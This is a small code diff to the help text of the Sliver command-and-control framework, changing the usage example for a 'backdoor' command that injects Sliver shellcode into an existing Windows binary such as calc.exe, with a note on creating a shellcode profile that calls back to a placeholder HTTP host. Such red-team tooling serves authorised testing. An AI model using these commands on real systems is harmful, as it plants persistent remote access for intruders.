@@ -462,7 +462,7 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 `
 	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
-[[.Bold]]Example:[[.Normal]] backdoor --profile z "c:\windows\system32\calc.exe"
+[[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
 
 [[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --http ab.cd windows-shellcode
 `
